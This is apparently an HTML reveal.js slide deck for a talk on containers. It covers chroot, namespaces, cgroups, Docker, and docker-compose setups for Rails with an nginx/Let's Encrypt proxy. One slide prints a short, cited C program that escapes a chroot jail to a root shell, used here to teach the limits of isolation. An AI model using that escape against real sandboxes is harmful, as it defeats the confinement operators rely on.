<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>Let's Encrypt Rails</title>

		<link rel="stylesheet" href="css/reveal.css">
		<link rel="stylesheet" href="css/theme/black.css">

		<!-- Theme used for syntax highlighting of code -->
		<link rel="stylesheet" href="lib/css/zenburn.css">

		<!-- Printing and PDF exports -->
		<script>
			var link = document.createElement( 'link' );
			link.rel = 'stylesheet';
			link.type = 'text/css';
			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
			document.getElementsByTagName( 'head' )[0].appendChild( link );
		</script>

    <style type="text/css">
      div.asciicast{
        /* asciinema JS doesn't work too well with hidden slides */
        width: 912px !important;
        height: 964px !important;
        max-height: 80vh !important;
        overflow: auto !important;
      }
      div.asciicast iframe {
        overflow: auto !important;
        max-height: none !important;
      }
    </style>

    <link rel="stylesheet" type="text/css" href="asciinema-player.css" />
    <script src="asciinema-player.js"></script>
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				<section>
          <h1>Let's Encrypt Rails</h1>
          <p>me [at] yongwen.xyz</p>
          <p>docker.yongwen.xyz</p>
        </section>

        <section>
          <h2>Containers vs Baremetal</h2>
          <img src="images/lxc-vs-baremetal.png" />
        </section>

        <section data-markdown>
          <script type="text/template">
            ## Containers
               - LXC (_lex-cee_)
               - Docker
            </script>
        </section>

        <section>
          <section>
            <h2>chroot</h2>
          </section>
           <section data-markdown>
              <script type="text/template">
                ## `chroot` Jail — Preparation

                ```bash
                ~$ J=$HOME/jail
                ~$ mkdir -p $J
                ~$ mkdir -p $J/{bin,lib64,lib}
                ~$ cd $J
                ~/jail$ cp -v /bin/{bash,ls} $J/bin
                '/bin/bash' -> '/home/yongwen/jail/bin/bash'
                '/bin/ls' -> '/home/yongwen/jail/bin/ls'
                ~/jail$ ldd /bin/bash
                  linux-vdso.so.1 =>  (0x00007fffc8122000)
                  libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f332ad75000)
                  libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f332ab71000)
                  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f332a7a7000)
                  /lib64/ld-linux-x86-64.so.2 (0x0000562479ccd000)
                ~/jail$ mkdir -p lib/x86_64-linux-gnu
                ~/jail$ cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu
                ~/jail$ mkdir lib64
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib64/
                ~/jail$ list="$(ldd /bin/ls | egrep -o '/lib.*\.[0-9]')"
                ~/jail$ for i in $list; do cp  -v "$i" "${J}${i}"; done
                '/lib/x86_64-linux-gnu/libselinux.so.1' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libselinux.so.1'
                '/lib/x86_64-linux-gnu/libc.so.6' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libc.so.6'
                '/lib/x86_64-linux-gnu/libpcre.so.3' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libpcre.so.3'
                '/lib/x86_64-linux-gnu/libdl.so.2' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libdl.so.2'
                '/lib64/ld-linux-x86-64.so.2' -> '/home/yongwen/jail/lib64/ld-linux-x86-64.so.2'
                '/lib/x86_64-linux-gnu/libpthread.so.0' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libpthread.so.0'
                ```

                <aside class="notes">
                  <ul>
                    <li>chroot jail changes the apparent root directory and its children</li>
                    <li>Lightweight virtualization</li>
                    <li>Not very user friendly</li>
                  </ul>
                </aside>
              </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ## chroot — Finally
               ```bash
               ~/jail$ sudo chroot $J /bin/bash
               bash-4.3# pwd
               /
               bash-4.3# ls -al
               total 20
               drwxrwxr-x 5 1000 1000 4096 Sep 13 02:46 .
               drwxrwxr-x 5 1000 1000 4096 Sep 13 02:46 ..
               drwxrwxr-x 2 1000 1000 4096 Sep 13 02:47 bin
               drwxrwxr-x 3 1000 1000 4096 Sep 13 02:48 lib
               drwxrwxr-x 2 1000 1000 4096 Sep 13 02:49 lib64
               bash-4.3# echo $$
               24475
               ```
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ## chroot Jailbreak  [[src]](https://filippo.io/escaping-a-chroot-jail-slash-1/)
               ```c
               #include <sys/stat.h>
               #include <unistd.h>
               #include <fcntl.h>

               int main() {
                   int dir_fd, x;
                   setuid(0); // set to root user
                   mkdir(".42", 0755); // create a temp directory
                   // get descriptor to current fake root
                   dir_fd = open(".", O_RDONLY);
                   chroot(".42"); // chroot to temp directory
                   fchdir(dir_fd); // cd to previous fake root

                   // At this point we have escaped the jail

                   close(dir_fd);
                   for(x = 0; x < 1000; x++) chdir(".."); // go up up up
                   chroot(".");
                   return execl("/bin/sh", "-i", NULL); // profit?
               }
               ```

               <aside class="notes">
                <p>Can be done by anyone with the `CAP_SYS_CHROOT` privilege (i.e. root has it)</p>
                <p>`chroot` all the way up to root.</p>
                <p>Spawn a shell from root.</p>
                <p>Profit???</p>
               </aside>
             </script>
           </section>

           <section>
               <h3>chroot Jailbreak</h3>
               <div id="chroot-player-container"></div>
               <script>
                asciinema.player.js.CreatePlayer('chroot-player-container', 'asciinema/chroot.json', { preload: true });
               </script>
           </section>
         </section>
       <section data-markdown>
         <script type="text/template">
           ## LXC [[1]](http://www.stgraber.org/2013/12/20/lxc-1-0-blog-post-series/)
           - A virtual machine without an emulated hardware layer and another OS layer
           - Makes use of Linux Kernel Features
              - Namespaces
              - Control Groups (cgroups)
              - chroot
              - AppArmor
              - SELinux
           <aside class="notes">
             <p>
               LXC (probably originally an acronym for Linux Containers) orchestrates several features of the
               Linux to allow users to set up unprivileged containers to isolate processes and applications, in
               both userland and kernel space. LXC takes care of networking and storage too.
             </p>
             <p>
               Pretty terrible documentation. Developed mainly on Ubuntu — so most things will be documented
               for Ubuntu, that may or may not work on other distributions.
             </p>
           </aside>
          </script>
       </section>

       <section>
           <section data-markdown>
             <script type="text/template">
               ## Namespace [[1]](http://www.haifux.org/lectures/299/netLec7.pdf) [[2]](https://media.wix.com/ugd/295986_d5059f95a78e451db5de3d54f711e45d.pdf) [[3]](https://lwn.net/Articles/531114/)

               - Lightweight process virtualisation
               - Seven Namespace Types:
                - uts (hostname)
                - ipc (Interprocess communication)
                - pid (processes)
                - mnt (mount points, filesystems)
                - net (network stack)
                - user (UIDs)
                - cgroup
               - [man](http://man7.org/linux/man-pages/man7/namespaces.7.html)

               <aside class="notes">
                 <p>`clone` — create a new process and namespace and attach process to new namespace</p>
                 <p>`unshare` — create a new namespace and attach current process</p>
                 <p>`setns` — join Namespace</p>
               </aside>
              </script>
          </section>

           <section data-markdown>
             <script type="text/template">
               ## Namespace
               ```bash
               $ ls -al /proc/self/ns
               total 0
               dr-x--x--x 2 yongwen yongwen 0 Sep 13 13:28 .
               dr-xr-xr-x 9 yongwen yongwen 0 Sep 13 10:46 ..
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 cgroup -> cgroup:[4026531835]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 ipc -> ipc:[4026531839]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 mnt -> mnt:[4026531840]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 net -> net:[4026531969]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 pid -> pid:[4026531836]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 user -> user:[4026531837]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 uts -> uts:[4026531838]
               ```
             </script>
           </section>

           <section>
             <h3>PID Namespace</h3>
             <div id="pid-player-container"></div>
             <script>
              asciinema.player.js.CreatePlayer('pid-player-container', 'asciinema/pid_ns.json', { preload: true });
             </script>
           </section>

           <section>
             <h3>PID and MNT Namespace</h3>
             <div id="mnt-player-container"></div>
             <script>
              asciinema.player.js.CreatePlayer('mnt-player-container', 'asciinema/pid_mnt_ns.json', { preload: true });
             </script>
           </section>
         </section>

         <section>
           <section>
             <h2> Namespace Types</h2>
           </section>

           <section data-markdown>
             <script type="text/template">
              ### UTS (Unix Timesharing) [[1]](https://blog.yadutaf.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/) [[2]](http://windsock.io/uts-namespace/)

              - Separate copy of hostname
              - ... and outdated [Network Information Service](http://docs.oracle.com/cd/E19455-01/806-1387/6jam692ca/index.html)
              <aside class="notes">
                <p>UTS is just an ancient term for multitasking on a Unix system</p>
                <p>In this context, is just that the processes have a separate copy of the hostname</p>
              </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### IPC (Interprocess Communication) [[1]](https://blog.yadutaf.fr/2013/12/28/introduction-to-linux-namespaces-part-2-ipc/) [[2]](http://windsock.io/ipc-namespace/)

               - `ipcs -a`
               - Isolates the various IPC mechanisms
                 - Pipes
                 - Shared Memory
                 - Message Queues
                 - Semaphores

                <aside class="notes">
                  <p>Separate set of IPC mechanism. No name collision</p>
                </aside>
             </script>

           </section>

           <section data-markdown>
             <script type="text/template">
               ### PID (Process ID) [[1]](https://blog.yadutaf.fr/2014/01/05/introduction-to-linux-namespaces-part-3-pid/) [[2]](http://windsock.io/pid-namespace/)

               - Restarts numbering of PID for child processes to 1
               - Only self (1) + descendants are visible
               - PID 1 is like the `init` process (like [`systemd`](https://en.wikipedia.org/wiki/Systemd))

               <aside class="notes">
                 Interesting <a href="http://unix.stackexchange.com/a/287282/189657">systemd</a>
               </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### mnt (mount points, filesystems) [[1]](https://blog.yadutaf.fr/2014/01/12/introduction-to-linux-namespaces-part-4-ns-fs/) [[2]](http://windsock.io/mnt-namespace/)

               - Created by copying mountpoints from spawning namespace
               - Isolated set of mount points
               - Any mount/unmounting will only affect the child
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### net (Network Stack) [[1]](https://blog.yadutaf.fr/2014/01/19/introduction-to-linux-namespaces-part-5-net/) [[2]](http://windsock.io/net-namespace/)

               - Private network stack — routews, firewall rules, network devices, ports
               - Communicate with the outside world via `veth`, for example

               <aside class="notes">
                 <p>A network device and socket belongs to exactly one network namespace</p>
                 <p>A new namespace only has the loopback device</p>
                 <p> Creating a pair of network devices (veth) and move one to another network namespace. — Veth (Virtual Ethernet) is like a pipe. </p>

               </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
              ### User (UIDs, PIDs) [[1]](https://lwn.net/Articles/532593/)

              - Separate set of UIDs and GIDs in processes
              - Needs to map inner UID/GID with parent UID/GID

              <aside class="notes">
                <p>By default mapped to overflow user — with no rights or capabilities</p>
              </aisde>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### cgroup [[1]](http://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html)

               - Separate set of cgroup root directories (`ls /proc/$$/cgroup`)
               - Child namespace takes parent namespace's cgroups as root cgroups
               - Prevents namespaced processes from escaping the limits/controls of ancestor cgroups

               <aside class="notes">
                Each cgroup namespace has its own set of cgroup root directories,
                which are the base points for the relative locations displayed in
                /proc/[pid]/cgroup.  When a process creates a new cgroup namespace
                using clone(2) or unshare(2) with the CLONE_NEWCGROUP flag, it enters
                a new cgroup namespace in which its current cgroups directories
                become the cgroup root directories of the new namespace.  (This
                applies both for the cgroups version 1 hierarchies and the cgroups
                version 2 unified hierarchy.)
               </aside>
             </script>
           </section>
        </section>

        <section>
          <section data-markdown>
            <script type="text/template">
              ## Control Groups (cgroups) (V1) [[1]](https://lwn.net/Articles/604609/) [[2]](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/Resource_Management_Guide/chap-Introduction_to_Control_Groups.htmll)

              - (Multiple) hierarchical organisation of processes
              - Associated with Linux Subsystems

              <aside class="notes">
                Historically, there has been a desire for both a organisational and classification need to
                group processes. cgroups tries to fulfil these two roles in a generic fashion.
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ## Process vs cgroups

              - All processes are children of PID 1 (i.e. `init`)
              - Processes can be in multiple cgroups (or called hierarchies)
              - Both are hierarchical
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### cgroup VFS

              - Works via a Virtual File System
              - All actions via filesystem actions
              - `/sys/fs/cgroup` for systemd

              <aside class="notes">
                All entries created in it are not persistent and deleted after reboot.
              </aside>
            </script>
          </section>

          <section>
            <h3>Root hierarchies</h3>
            <pre>
$ ls -l /sys/fs/cgroup | awk '{print $9, $10, $11}'
blkio
cgmanager
cpu -> cpu,cpuacct
cpuacct -> cpu,cpuacct
cpu,cpuacct
cpuset
devices
freezer
hugetlb
memory
net_cls -> net_cls,net_prio
net_cls,net_prio
net_prio -> net_cls,net_prio
perf_event
pids
systemd
            </pre>
          </section>

          <section>
            <h3><code>systemd</code> cgroup</h3>
            <pre>
ls -l /sys/fs/cgroup/systemd | awk '{print $9, $10, $11}'
cgroup.clone_children
cgroup.procs
cgroup.sane_behavior
<strong style="color: red">docker</strong>
<strong style="color: red">init.scope</strong>
notify_on_release
release_agent
<strong style="color: red">system.slice</strong>
tasks
<strong style="color: red">user</strong>
<strong style="color: red">user.slice</strong>
            </pre>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### cgroup files

              - Directories: Child cgroups
              - `tasks`: list of tasks (PID) [[1]](http://stackoverflow.com/a/9306150/602002)
              - `cgroup.procs`- list of thread group IDs [[1]](http://stackoverflow.com/a/9306150/602002)
              - `notify_on_release`: Flag to run `release_agent` path on exit
              - Other files: specific to the cgroup, usually written by the subsystems using the cgroup
            </script>
          </section>

          <section>
            <h3>Subsystems</h3>
            <pre>
  $ column -t /proc/cgroups
  #subsys_name  hierarchy  num_cgroups  enabled
  cpuset        7          5            1
  cpu           2          112          1
  cpuacct       2          112          1
  blkio         11         112          1
  memory        9          168          1
  devices       8          112          1
  freezer       4          8            1
  net_cls       5          5            1
  perf_event    6          5            1
  net_prio      5          5            1
  hugetlb       3          5            1
  pids          10         113          1
            </pre>

            <aside class="notes">
              From <a href="http://man7.org/linux/man-pages/man7/cgroups.7.html">man</a>
              The fields in this file are, from left to right:
              <ol>
                <li>The name of the controller.</li>
                <li>The unique ID of the cgroup hierarchy on which this controller is mounted. </li>
                <li>The number of control groups in this hierarchy using this controller.</li>
                <li>This field contains the value 1 if this controller is enabled, or 0 if it has been disabled </li>
              </ol>
            </aside>
          </section>
          <section>
            <h3>cgroups and subsystems for a process</h3>
            <pre>
$ cat /proc/self/cgroup
11:blkio:/user.slice
10:pids:/user.slice/user-1000.slice
9:memory:/user.slice
8:devices:/user.slice
7:cpuset:/
6:perf_event:/
5:net_cls,net_prio:/
4:freezer:/
3:hugetlb:/
2:cpu,cpuacct:/user.slice
1:name=systemd:/user.slice/user-1000.slice/session-c2.scope
            </pre>

            <aside class="notes">
              From <a href="http://man7.org/linux/man-pages/man7/cgroups.7.html">man</a>:
              For each cgroup hierarchy of which the process is a member,
            there is one entry containing three colon-separated fields of
            the form:

                 hierarchy-ID:subsystem-list:cgroup-path
            </aside>
          </section>

          <section data-markdown>
            <script type="text/template">
                ### Subsystems

                - In `4.4.0-36`: `cpuset, cpu, cpuacct, blkio, memory, devices,
                freezer, net_cls, perf_event, net_prio, hugetlb, pids` [[1]](http://man7.org/linux/man-pages/man7/cgroups.7.html)
                - Some subsystems simply identify processes or collect information (e.g. cpuacct)
                - Some subsystems impose control (e.g. cpuset, cpu, memory)
                - Subsystems can choose to push data down the hierarchy (e.g. freezer)
                - or upwards (e.g. perf_event)


                <aside class="notes">
                  <a href="http://man7.org/linux/man-pages/man7/cgroups.7.html">man</a>
                  <h5>cpu </h5>
                  Cgroups can be guaranteed a minimum number of "CPU shares"
                  when a system is busy.  This does not limit a cgroup's CPU
                  usage if the CPUs are not busy.
                  <h5>cpuacct</h5>
                  This provides accounting for CPU usage by groups of tasks.
                  <h5>cpuset</h5>
                  This cgroup can be used to bind the tasks in a cgroup to a specified set of CPUs and NUMA nodes.
                  <h5>memory</h5>
                  The memory controller supports reporting and limiting of
                  process memory, kernel memory, and swap used by cgroups.
                  <h5>devices</h5>
                  This supports controlling which tasks may create (mknod)
                  devices as well as open them for reading or writing.  The
                  policies may be specified as whitelists and blacklists.
                  Hierarchy is enforced, so new rules must not violate existing
                  rules for the target or ancestor cgroups.
                  <h5>freezer</h5>
                  The freezer cgroup can suspend and restore (resume) all tasks
                  in a cgroup.  Freezing a cgroup /A also causes its children,
                  for example, tasks in /A/B, to be frozen.
                  <h5>net_cls</h5>
                  This places a classid, specified for the cgroup, on network
                  packets created by a cgroup.  These classids can then be used
                  in firewall rules, as well as used to shape traffic using
                  tc(8).  This applies only to packets leaving the cgroup, not
                  to traffic arriving at the cgroup.
                  <h5>blkio</h5>
                  The blkio cgroup controls and limits access to specified block
                  devices by applying IO control in the form of throttling and
                  upper limits against leaf nodes and intermediate nodes in the
                  storage hierarchy.
                  <h5>perf_event</h5>
                  This controller allows perf monitoring of the set of processes
                  grouped in a cgroup.
                  <h5>net_prio</h5>
                  This allows priorities to be specified, per network interface,
                  for cgroups.
                  <h5>hugetlb</h5>
                  This supports limiting the use of huge pages by cgroups.
                  <h5>pids</h5>
                  This controller permits limiting the number of process that
                  may be created in a cgroup (and its descendants).
                </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### cgroup V2

              - A single unified hierarchy
              - Tasks (processes) only in leaf nodes
              - [Read more](https://www.kernel.org/doc/Documentation/cgroup-v2.txt)
            </script>
          </section>
        </section>
        <section>
          <section data-markdown>
            <script type="text/template">
              ## Docker

              - Run *applications* in an isolated manner in containers
              - Designed to run a _single process_
              - No storage persistence by default

              <aside class="notes">
                <p>Docker is a technology not too dis-similar from LXC. It is designed to run a single process
                in an isolated manner in terms of storage, processes, IPC, network etc.</p>

                <p>Since it is designed to run a single process, many applications don't work well with it out of the
                box and LXC is an easiler replacement.</p>
              </aside>
            </script>
          </section>

          <!-- <section data-markdown>
            <script type="text/template">
              [![Top](images/top.png)](images/top.png)
            </script>
          </section> -->

          <section>
            <h3>LXC vs Docker</h3>
            <img src="images/lxc-vs-docker.png" />
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker's relationship with LXC [[1]](http://jancorg.github.io/blog/2015/01/03/libcontainer-overview/)

              ![Diagram](images/docker-lxc-relationship.png)

              <aside class="notes">
                <p>Docker used to use LXC as one of its execution driver</p>
                <p>Now it uses libcontainer directly as a form of abstraction</p>
                <p>Libcontainer can use LXC as an execution driver</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Layers

              ![Layers](images/docker-layers.jpg)

              <aside class="notes">
                <p>Docker images layers are R/O and are shared</p>
                <p>Containers run inside a thin R/W layer that is discarded along with the container</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Copy on Write

              - Only copy when shared data requires modification

              ![Layers](images/changed-ubuntu.jpg)
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Storage Drivers

              ![Drivers](images/docker-storage-drivers.png)

              <aside class="notes">
                When choosing a storage driver, you would have to consider the filesystem you are using and your use
                case. Some drivers are disabled on certain file systems. By default, a Docker installation will choose
                a driver that is most stable for your system.
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### AUFS [[1]](https://docs.docker.com/engine/userguide/storagedriver/aufs-driver/)

              - Original Docker Storage Driver
              - Unification filesystem

              ![AUFS](images/aufs-layers.jpg)

              <aside class="notes">
                <p>AUFS the first storage driver for Docker, and the Docker image layering system was developed
                in tandem with AUFS. </p>

                <p>The issue with AUFS is that it is not part of the mainline kernel, and when other Linux distributions
                  such as RedHat wanted to implement Docker, Docker implemented the storage driver system to allow
                  other drivers.</p>

                <p>Not unlike the Image layer system, AUFS is a unification filesystem by stacking multiple directories
                  on a Linux host as layers to provide a single unified view</p>

                <p>The stacked unified view is viewed through a mount point known as the union mount point. Each
                layer is called a branch.</p>

              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### AUFS Copy On Write

              #![COW](images/aufs-files.jpg)

              <aside class="notes">
                <p>When a file needs to be modified, AUFS copies the entire file and then saves the modified file
                  in an upper branch</p>
                <p>This can cause an impact if the files modified are large, or the branches or directories are deep.</p>
                <p>When deleting a file, AUFS writes a "whiteout" file to indicate the deletion of the file.</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Complexities

              - [Zombie reaping issue](https://blog.phusion.nl/2015/01/20/docker-and-the-pid-1-zombie-reaping-problem/)
              - Multiple containers to run simple application
                - Rails
                - Database
                - Resque
                - etc.
              - See [`baseimage-docker`](https://github.com/phusion/baseimage-docker)
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Complexities

              ```bash
              $ docker run --help

              Usage:	docker run [OPTIONS] IMAGE [COMMAND] [ARG...]

              Run a command in a new container

              Options:
              --add-host value              Add a custom host-to-IP mapping (host:ip) (default [])
              -a, --attach value                Attach to STDIN, STDOUT or STDERR (default [])
              --blkio-weight value          Block IO (relative weight), between 10 and 1000
              --blkio-weight-device value   Block IO weight (relative device weight) (default [])
              --cap-add value               Add Linux capabilities (default [])
              --cap-drop value              Drop Linux capabilities (default [])
              --cgroup-parent string        Optional parent cgroup for the container
              --cidfile string              Write the container ID to the file
              --cpu-percent int             CPU percent (Windows only)
              --cpu-period int              Limit CPU CFS (Completely Fair Scheduler) period
              --cpu-quota int               Limit CPU CFS (Completely Fair Scheduler) quota
              -c, --cpu-shares int              CPU shares (relative weight)
              --cpuset-cpus string          CPUs in which to allow execution (0-3, 0,1)
              --cpuset-mems string          MEMs in which to allow execution (0-3, 0,1)
              -d, --detach                      Run container in background and print container ID
              --detach-keys string          Override the key sequence for detaching a container
              --device value                Add a host device to the container (default [])
              --device-read-bps value       Limit read rate (bytes per second) from a device (default [])
              --device-read-iops value      Limit read rate (IO per second) from a device (default [])
              --device-write-bps value      Limit write rate (bytes per second) to a device (default [])
              --device-write-iops value     Limit write rate (IO per second) to a device (default [])
              --disable-content-trust       Skip image verification (default true)
              --dns value                   Set custom DNS servers (default [])
              --dns-opt value               Set DNS options (default [])
              --dns-search value            Set custom DNS search domains (default [])
              --entrypoint string           Overwrite the default ENTRYPOINT of the image
              -e, --env value                   Set environment variables (default [])
              --env-file value              Read in a file of environment variables (default [])
              --expose value                Expose a port or a range of ports (default [])
              --group-add value             Add additional groups to join (default [])
              --health-cmd string           Command to run to check health
              --health-interval duration    Time between running the check
              --health-retries int          Consecutive failures needed to report unhealthy
              --health-timeout duration     Maximum time to allow one check to run
              --help                        Print usage
              -h, --hostname string             Container host name
              -i, --interactive                 Keep STDIN open even if not attached
              --io-maxbandwidth string      Maximum IO bandwidth limit for the system drive (Windows only)
              --io-maxiops uint             Maximum IOps limit for the system drive (Windows only)
              --ip string                   Container IPv4 address (e.g. 172.30.100.104)
              --ip6 string                  Container IPv6 address (e.g. 2001:db8::33)
              --ipc string                  IPC namespace to use
              --isolation string            Container isolation technology
              --kernel-memory string        Kernel memory limit
              -l, --label value                 Set meta data on a container (default [])
              --label-file value            Read in a line delimited file of labels (default [])
              --link value                  Add link to another container (default [])
              --link-local-ip value         Container IPv4/IPv6 link-local addresses (default [])
              --log-driver string           Logging driver for the container
              --log-opt value               Log driver options (default [])
              --mac-address string          Container MAC address (e.g. 92:d0:c6:0a:29:33)
              -m, --memory string               Memory limit
              --memory-reservation string   Memory soft limit
              --memory-swap string          Swap limit equal to memory plus swap: '-1' to enable unlimited swap
              --memory-swappiness int       Tune container memory swappiness (0 to 100) (default -1)
              --name string                 Assign a name to the container
              --network string              Connect a container to a network (default "default")
              --network-alias value         Add network-scoped alias for the container (default [])
              --no-healthcheck              Disable any container-specified HEALTHCHECK
              --oom-kill-disable            Disable OOM Killer
              --oom-score-adj int           Tune host's OOM preferences (-1000 to 1000)
              --pid string                  PID namespace to use
              --pids-limit int              Tune container pids limit (set -1 for unlimited)
              --privileged                  Give extended privileges to this container
              -p, --publish value               Publish a container's port(s) to the host (default [])
              -P, --publish-all                 Publish all exposed ports to random ports
              --read-only                   Mount the container's root filesystem as read only
              --restart string              Restart policy to apply when a container exits (default "no")
              --rm                          Automatically remove the container when it exits
              --runtime string              Runtime to use for this container
              --security-opt value          Security Options (default [])
              --shm-size string             Size of /dev/shm, default value is 64MB
              --sig-proxy                   Proxy received signals to the process (default true)
              --stop-signal string          Signal to stop a container, SIGTERM by default (default "SIGTERM")
              --storage-opt value           Storage driver options for the container (default [])
              --sysctl value                Sysctl options (default map[])
              --tmpfs value                 Mount a tmpfs directory (default [])
              -t, --tty                         Allocate a pseudo-TTY
              --ulimit value                Ulimit options (default [])
              -u, --user string                 Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])
              --userns string               User namespace to use
              --uts string                  UTS namespace to use
              -v, --volume value                Bind mount a volume (default [])
              --volume-driver string        Optional volume driver for the container
              --volumes-from value          Mount volumes from the specified container(s) (default [])
              -w, --workdir string              Working directory inside the container
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Example Rails Application

              ```bash
              mkdir example
              cd example
              rails new . --database=postgresql
              # Postgres Host: postgres
              # Database: example_development
              # User: example
              # Passsword: example
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Dockerfile

              ```dockerfile
              FROM ruby:2.3.1

              WORKDIR /app/src
              EXPOSE 3000

              COPY Gemfile Gemfile.lock /app/src/
              RUN bundle install --frozen --no-cache

              COPY . /app/src
              CMD ["bundle", "exec", "rails", "s", "-b", "0.0.0.0"]
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Preparing Docker Containers

              ```bash
              # Create network for containers
              docker network create ror_example

              # Build Rails image
              docker build -t example_rails .
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Starting Docker Containers

              ```bash
              # Postgres Container
              docker run --name example_postgres -d \
                --network ror_example --network-alias postgres \
                --restart always \
                -e "POSTGRES_DB=example_development"  \
                -e "POSTGRES_USER=example" \
                -e "POSTGRES_PASSWORD=example" \
                -v example_pg:/var/lib/postgresql/data \
                postgres:9.5

              # Rails Container
              docker run --name example_rails -d \
                --network ror_example \
                --restart always \
                --publish "3000:3000" \
                example_rails
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### docker-compose

              - Orchestrates multiple containers and their parameters in a single `.yml` file
              - Allows declaration of container dependencies
              - [Soon](https://github.com/docker/compose/issues/3754) — Container [healthcheck](https://docs.docker.com/engine/reference/builder/#/healthcheck)
              - `docker-compose up`
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### `docker-compose.yml`

              ```yml
              version: "2.0"
              services:
                postgres:
                  image: postgres:9.5
                  environment:
                    POSTGRES_DB: example_development
                    POSTGRES_USER: example
                    POSTGRES_PASSWORD: example
                  volumes:
                    - pg_data:/var/lib/postgresql/data
                  restart: always
                rails:
                  build: .
                  depends_on:
                    - postgres
                  ports:
                    - "3000:3000"
                  restart: always
              volumes:
                pg_data: {}
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### nginx Reverse Proxy with Let's Encrypt TLS Certificate [[1]](https://github.com/lawliet89/docker-nginx-tutorial)

              ![Diagram](images/ror-docker.png)
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### `docker-compose.yml`

              ```yml
              version: "2"
              services:
                nginx:
                  image: nginx
                  container_name: nginx
                  ports:
                    - 80:80
                    - 443:443
                  volumes:
                    - nginx_conf:/etc/nginx/conf.d
                    - nginx_vhost:/etc/nginx/vhost.d
                    - nginx_html:/usr/share/nginx/html
                    - nginx_certs:/etc/nginx/certs:ro
                  networks:
                    - nginx
                nginx_gen:
                   image: jwilder/docker-gen
                   container_name: nginx_gen
                   volumes_from:
                    - nginx
                   volumes:
                     - ./nginx-proxy/nginx.tmpl:/etc/docker-gen/templates/nginx.tmpl:ro
                     - /var/run/docker.sock:/tmp/docker.sock:ro
                   command: ["-notify-sighup", "nginx", "-watch", "-wait",
                             "5s:30s", "/etc/docker-gen/templates/nginx.tmpl",
                             "/etc/nginx/conf.d/default.conf"]
                   networks:
                     - nginx
                letsencrypt:
                  image: jrcs/letsencrypt-nginx-proxy-companion
                  environment:
                    NGINX_DOCKER_GEN_CONTAINER: nginx_gen
                  volumes_from:
                    - nginx
                  volumes:
                    - nginx_certs:/etc/nginx/certs:rw
                    - /var/run/docker.sock:/var/run/docker.sock:ro
                  depends_on:
                    - nginx_gen
                  networks:
                    - nginx
              volumes:
                nginx_conf: {}
                nginx_vhost: {}
                nginx_html: {}
                nginx_certs: {}
              networks:
                nginx:
                  external: true
              ```
            </script>
          </section>

          <section>
            <a style="font-size: small;" href="https://asciinema.org/a/85808">[1]</a>
            <script type="text/javascript" src="https://asciinema.org/a/85808.js" id="asciicast-85808" data-preload="1" async></script>
          </section>

          <section>
            <a style="font-size: small;" href="https://asciinema.org/a/85810">[1]</a>
            <script type="text/javascript" src="https://asciinema.org/a/85810.js" id="asciicast-85810" data-preload="1" async></script>
          </section>

          <section>
